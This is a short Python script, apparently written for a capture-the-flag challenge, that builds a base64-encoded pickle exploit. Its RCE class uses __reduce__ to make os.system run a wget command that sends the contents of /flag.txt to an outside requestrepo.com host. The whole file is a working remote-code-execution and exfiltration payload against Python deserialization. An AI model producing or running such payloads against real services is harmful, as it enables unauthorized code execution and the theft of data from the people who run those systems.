import io
import pickle
import os
import base64


class RCE:
    def __reduce__(self):
        return os.system, ("wget http://v85wgu1t.requestrepo.com?cmd=`cat /flag.txt`",)


pickled_data = base64.b64encode(pickle.dumps(RCE()))
cmd = pickled_data.decode("ascii")

print(cmd)
# pickle.loads(base64.urlsafe_b64decode(cmd))
